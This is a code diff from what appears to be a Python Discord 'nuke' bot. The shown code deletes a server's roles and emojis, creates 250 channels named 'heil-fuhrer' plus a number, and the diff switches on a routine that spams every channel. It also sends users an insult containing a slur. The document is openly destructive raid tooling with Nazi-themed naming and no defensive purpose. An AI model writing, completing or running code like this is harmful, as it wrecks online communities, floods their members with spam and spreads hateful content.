@@ -80,8 +80,8 @@ https://cdn.discordapp.com/attachments/693974529923612728/708740617496428604/158
         await ctx.guild.create_text_channel("no-delete")
         for i in range(250):
             try:
-                channel = await ctx.guild.create_text_channel(f"heil-fuhrer-{i+1}")
-                await channel.send(">spam")
+                await ctx.guild.create_text_channel(f"heil-fuhrer-{i+1}")
+                # await channel.send(">spam")
             except:
                 print(f"Created ( {i} channels )")
 
@@ -117,7 +117,7 @@ https://cdn.discordapp.com/attachments/693974529923612728/708740617496428604/158
                 await self.delete_roles(ctx)
                 await self.delete_emojis(ctx)
                 await self.make_channels(ctx)
-                # await self.spam_all_channels(ctx)
+                await self.spam_all_channels(ctx)
                 print("Done!")
             else:
                 await ctx.author.send("You fucking retard, you can't nuke this server.")
